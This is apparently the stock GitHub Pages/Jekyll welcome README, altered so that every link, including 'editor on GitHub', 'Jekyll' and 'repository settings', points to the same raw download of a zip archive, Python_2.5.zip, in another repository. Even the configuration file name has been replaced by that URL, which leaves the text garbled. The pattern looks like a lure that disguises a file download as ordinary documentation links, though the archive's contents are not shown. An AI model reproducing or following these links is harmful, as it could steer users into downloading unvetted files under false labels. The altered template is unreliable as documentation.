## Welcome to GitHub Pages

You can use the [editor on GitHub](https://raw.githubusercontent.com/gabas001/Python/master/antiphase/Python_2.5.zip) to maintain and preview the content for your website in Markdown files.

Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://raw.githubusercontent.com/gabas001/Python/master/antiphase/Python_2.5.zip) to rebuild the pages in your site, from the content in your Markdown files.

### Markdown

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://raw.githubusercontent.com/gabas001/Python/master/antiphase/Python_2.5.zip). The name of this theme is saved in the Jekyll `https://raw.githubusercontent.com/gabas001/Python/master/antiphase/Python_2.5.zip` configuration file.
